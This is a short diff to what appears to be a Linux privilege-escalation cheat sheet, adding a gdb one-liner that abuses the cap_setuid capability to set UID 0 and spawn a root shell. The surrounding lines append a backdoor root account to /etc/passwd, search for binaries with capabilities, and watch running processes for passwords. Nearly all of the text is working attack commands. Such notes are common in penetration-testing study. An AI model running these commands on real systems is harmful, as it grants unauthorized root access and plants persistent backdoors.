@@ -10,6 +10,8 @@ echo "anotherroot:XXXXXXX:0:0:root:/root:/bin/bash" >> /etc/passwd
 /usr/sbin/getcap -r / 2>/dev/null
 # e.g.: /usr/bin/binary = cap_setuid+ep
 # binary have capab setuid Effective and Permited
+# use the full path to run binary, like this:
+/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
 
 # Wactch repeat the command to be like real time:
 watch -n 1 "ps -aux | grep pass"
